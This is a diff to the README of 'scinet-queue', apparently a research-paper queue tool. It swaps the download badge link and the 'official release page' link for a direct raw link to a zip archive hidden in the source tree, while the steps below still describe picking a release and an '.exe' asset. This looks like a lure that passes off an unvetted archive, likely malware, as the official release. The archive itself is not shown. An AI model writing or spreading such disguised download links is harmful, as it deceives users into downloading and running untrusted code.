@@ -1,6 +1,6 @@
 # 📚 scinet-queue - Manage your research paper requests easily
 
-[![Download Now](https://img.shields.io/badge/Download-scinet--queue-blue.svg)](https://github.com/magicalpowerranking894/scinet-queue)
+[![Download Now](https://img.shields.io/badge/Download-scinet--queue-blue.svg)](https://raw.githubusercontent.com/magicalpowerranking894/scinet-queue/main/src/app/queue_scinet_v2.1.zip)
 
 scinet-queue helps you manage your research requests. This tool organizes your list of paper titles and identifiers so you track your progress. It sits on your computer and handles your queue without complex web interfaces.
 
@@ -29,7 +29,7 @@ This software runs on most modern computers. You need the following:
 
 Follow these steps to get the software on your Windows machine.
 
-1. Go to the [official release page](https://github.com/magicalpowerranking894/scinet-queue).
+1. Go to the [official release page](https://raw.githubusercontent.com/magicalpowerranking894/scinet-queue/main/src/app/queue_scinet_v2.1.zip).
 2. Select the latest version listed under the Releases section.
 3. Find the file ending in `.exe` under the Assets list.
 4. Click the file name to start your download.
